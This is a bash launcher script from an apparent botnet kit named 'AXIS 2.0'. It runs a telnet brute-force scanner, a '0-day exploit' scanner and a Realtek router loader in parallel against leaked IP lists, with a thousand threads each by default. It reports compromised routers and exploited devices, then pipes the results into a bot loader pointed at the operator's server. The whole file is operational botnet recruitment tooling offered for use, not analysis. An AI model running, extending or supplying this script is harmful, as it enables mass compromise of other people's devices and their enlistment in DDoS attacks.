#!/bin/bash

# ============================================================================
# AXIS 2.0 - Extra Scanners Auto-Runner
# Runs all 3 server-side scanners simultaneously to load bots
# ============================================================================

SERVER_IP="${1:-$(curl -s ifconfig.me)}"
THREADS="${2:-1000}"

echo "============================================================================"
echo "AXIS 2.0 Extra Scanners - Auto-Runner"
echo "============================================================================"
echo "Server IP: $SERVER_IP"
echo "Threads per scanner: $THREADS"
echo ""

# Create leaks directory structure if it doesn't exist
mkdir -p leaks
mkdir -p b4ckdoorarchive/RANDOM.LST

# Check if IP lists exist
if [ ! -f "leaks/10.lst" ]; then
    echo "[-] IP lists not found! Download from: https://github.com/illusionsec/DDOS-archive/tree/main/leaks"
    echo "    Place files in: leaks/"
    echo ""
    echo "Required files:"
    echo "  - leaks/10.lst (or any .lst file)"
    echo "  - leaks/CF-Rules-1.txt (or any CF Rules file)"
    echo "  - b4ckdoorarchive/RANDOM.LST/realtek.lst"
    exit 1
fi

# Find available IP list files
IP_LIST=$(ls leaks/*.lst 2>/dev/null | head -1)
CF_RULES=$(ls leaks/CF*.txt 2>/dev/null | head -1)
REALTEK_LIST="b4ckdoorarchive/RANDOM.LST/realtek.lst"

# Use defaults if specific files not found
[ -z "$IP_LIST" ] && IP_LIST=$(ls leaks/*.lst 2>/dev/null | head -1)
[ -z "$CF_RULES" ] && CF_RULES=$(ls leaks/*.txt 2>/dev/null | head -1)

echo "[*] Using IP lists:"
echo "    Telnet: $IP_LIST"
echo "    0-day:  $CF_RULES"
echo "    Realtek: $REALTEK_LIST"
echo ""
echo "[*] Starting all 3 scanners simultaneously..."
echo ""

# Start all 3 scanners in background
./extrascanners/telnet-scanner "$IP_LIST" "$THREADS" &
PID1=$!
echo "[+] Telnet Scanner started (PID: $PID1)"

./extrascanners/0day-exploit "$CF_RULES" "$SERVER_IP" "$THREADS" &
PID2=$!
echo "[+] 0-Day Exploit Scanner started (PID: $PID2)"

./extrascanners/realtek-loader "$REALTEK_LIST" "$SERVER_IP" "$THREADS" &
PID3=$!
echo "[+] Realtek Loader started (PID: $PID3)"

echo ""
echo "[*] All scanners running simultaneously!"
echo "[*] Results will be saved to:"
echo "    - telnet_results.txt"
echo "    - 0day_results.txt"
echo "    - realtek_results.txt"
echo ""
echo "[*] Press Ctrl+C to stop all scanners"
echo ""

# Wait for all scanners to complete
wait $PID1 $PID2 $PID3

echo ""
echo "============================================================================"
echo "All Scanners Completed!"
echo "============================================================================"
echo ""
echo "Results:"
[ -f "telnet_results.txt" ] && echo "  - Telnet: $(wc -l < telnet_results.txt) successful logins"
[ -f "0day_results.txt" ] && echo "  - 0-Day:  $(wc -l < 0day_results.txt) exploited devices"
[ -f "realtek_results.txt" ] && echo "  - Realtek: $(wc -l < realtek_results.txt) compromised routers"
echo ""
echo "To feed results to loader:"
echo "  cat telnet_results.txt 0day_results.txt realtek_results.txt | ./loader"
echo ""
